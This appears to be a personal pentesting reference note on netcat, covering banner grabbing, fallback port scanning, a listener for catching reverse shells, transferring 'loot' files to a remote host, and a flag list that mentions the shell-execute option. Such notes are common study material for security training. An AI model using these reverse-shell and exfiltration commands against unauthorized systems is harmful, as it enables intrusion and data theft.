
Use this to connect and get a better idea what could be running on different ports:

```bash
nc -nv <IP> <port>
```
If it's a text-based service (HTTP, FTP, SMTP, etc.) it'll often print a banner right away, or after you send it something (e.g. hit enter a couple times, or send `HEAD / HTTP/1.0` followed by two newlines for a web server).

**Port scanning (when nmap isn't an option)**
```bash
nc -nvz <IP> 1-1000       # TCP connect scan, a range
nc -nvzu <IP> 53 161 162  # UDP, specific ports
```
Slower and noisier than nmap — use nmap first ([[nmap]]), fall back to this only if nmap isn't available on the box you're pivoting from.

**Listener (catching a reverse shell)**
```bash
nc -lvnp <port>
```
This is what you run on your attack box before triggering a payload that connects back to you. What you land in afterward is a raw shell — see [[11.1 Where to even start]] Phase 0 for stabilizing it.

**File transfer**
```bash
# receiving end
nc -lvnp <port> > loot.txt

# sending end
nc <IP> <port> < loot.txt
```

**Flags**
```diff
-l   listen mode
-v   verbose
-n   skip DNS resolution
-p   local port (only needed in listen mode)
-z   zero-I/O mode, for scanning — don't send data
-u   UDP instead of TCP
-w   timeout in seconds
-e   execute a program on connect (often stripped from modern builds — the "shell" flag old versions had)
```